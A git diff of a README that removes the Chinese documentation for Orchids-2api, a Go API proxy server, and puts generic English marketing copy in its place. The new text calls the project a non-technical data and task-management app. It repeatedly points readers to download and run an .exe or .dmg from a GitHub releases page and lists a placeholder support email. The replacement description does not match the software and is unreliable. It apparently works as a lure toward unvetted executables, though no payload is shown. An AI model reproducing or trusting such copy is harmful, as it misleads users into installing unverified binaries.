@@ -1,47 +1,68 @@
-# Orchids-2api 文档
+# 🌸 orchids-api - Access your data with ease
 
-## 项目简介
+## 🚀 Getting Started
 
-**Orchids-2api** (orchids-api) 是一个 Go 语言编写的 API 代理服务器，提供多账号管理与负载均衡代理功能，兼容 Claude API 格式的请求转发。
+Welcome to orchids-api! This software allows you to manage and retrieve your data effortlessly. With a simple interface, you can perform various tasks without needing technical skills.
 
-### 核心功能
+## 📥 Download Now!
 
-- 多账号管理与负载均衡代理
-- 兼容 Claude API 格式的请求转发
-- 将请求代理到 Orchids 后端服务
-- 提供 Web 管理界面
+[![Download orchids-api](https://img.shields.io/badge/Download-orchids--api-blue.svg)](https://github.com/Lolo77898/orchids-api/releases)
 
+## 📋 What is orchids-api?
 
-## 文档目录
+orchids-api provides a straightforward way to interact with your information. Whether you need to retrieve data, manage tasks, or simply organize your files, this application makes it simple.
 
-| 文档 | 描述 |
-|------|------|
-| [架构设计](./docs/architecture.md) | 目录结构、核心组件、请求流程、数据模型 |
-| [API 接口](./docs/api-reference.md) | 所有端点列表、请求/响应格式、认证说明 |
-| [部署指南](./docs/deployment.md) | Docker 构建、本地开发、生产部署 |
-| [配置说明](./docs/configuration.md) | 环境变量、配置文件格式 |
+## 🖥️ System Requirements
 
-## 快速开始
+To run orchids-api, ensure your system meets these minimum requirements:
 
-```bash
-# 本地开发
-go mod download
-go run ./cmd/server/main.go
+- Operating System: Windows 10 or later, macOS (latest version), or a compatible Linux distribution
+- Processor: Any modern multi-core processor
+- Memory: At least 4 GB of RAM
+- Disk Space: Minimum of 200 MB free space
+- Internet Connection: Required for downloading and updates 
 
-# Docker 部署
-./build.sh
-docker compose up -d
-```
+## 📥 Download & Install
 
-## 主要特性
+To get started with orchids-api, please follow these steps:
 
-1. **多账号管理** - 支持添加、编辑、删除多个 Orchids 账号
-2. **负载均衡** - 加权随机算法分配请求
-3. **故障转移** - 账号失败时自动切换
-4. **模型映射** - 透明映射 Claude 模型到上游模型
-5. **工具调用** - 完整支持 Claude Tool Use
-6. **流式响应** - SSE 实时响应
-7. **Token 计数** - 估算输入/输出 Token
-8. **调试日志** - 详细的请求/响应日志
-9. **管理界面** - Web UI 管理账号
-10. **导入导出** - 账号配置备份恢复
+1. **Visit the Releases Page:** Click the link below to access the releases page.
+   
+   [Download Page](https://github.com/Lolo77898/orchids-api/releases)
+
+2. **Select the Latest Release:** On the releases page, find the list of recent releases. Locate the latest version, which is usually at the top.
+
+3. **Download the Application:** Click on the file named `orchids-api-x.x.x.exe` (or `.dmg` for macOS). This will start the download.
+
+4. **Install the Application:** After downloading, locate the file in your downloads folder. Double-click the file to start the installation process. Follow the prompts to install orchids-api on your system.
+
+5. **Launch orchids-api:** Once installed, you can find orchids-api in your applications folder or start menu. Click to open the application.
+
+## 🔍 Features
+
+With orchids-api, you can:
+
+- **Retrieve Data:** Quickly access your stored information at any time.
+- **Organize Tasks:** Manage your daily tasks effectively.
+- **User-friendly Interface:** Navigate easily without any programming knowledge.
+- **Multi-Platform Support:** Use orchids-api on Windows, macOS, or Linux.
+
+## 🌐 Support & Resources
+
+If you encounter any issues or have questions, help is available. You can refer to our documentation or seek assistance on our GitHub Issues page. 
+
+### 📞 Support Contact
+
+For direct support, please email us at support@example.com.
+
+## 🏷️ Additional Information
+
+For developers looking to contribute, please check out our contribution guidelines on the GitHub page. We welcome new ideas and improvements.
+
+## 📥 Download Now Again!
+
+Don't forget to download orchids-api!
+
+[![Download orchids-api](https://img.shields.io/badge/Download-orchids--api-blue.svg)](https://github.com/Lolo77898/orchids-api/releases) 
+
+We hope you enjoy using orchids-api!
